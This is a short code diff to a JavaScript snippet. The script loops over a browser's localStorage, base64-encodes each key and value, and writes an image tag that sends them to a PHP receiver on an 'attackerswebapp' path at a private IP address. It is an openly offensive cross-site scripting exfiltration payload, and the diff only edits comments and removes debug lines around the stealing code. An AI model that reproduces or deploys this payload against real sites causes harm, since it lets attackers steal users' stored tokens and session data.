@@ -38,10 +38,8 @@ newString = "";
 for (var a in localStorage) {
     newString += a + "="
     newString += localStorage[a];
-    // Encode the String
+    // Encode the String with base64
     var encodedString = btoa(unescape(encodeURIComponent(newString)))
-    //console.log(newString);
-    //console.log(encodedString);
     document.write('<img src="https://10.10.10.10/attackerswebapp/receiver.php?str='+encodedString+'">');
     newString = "";
 }
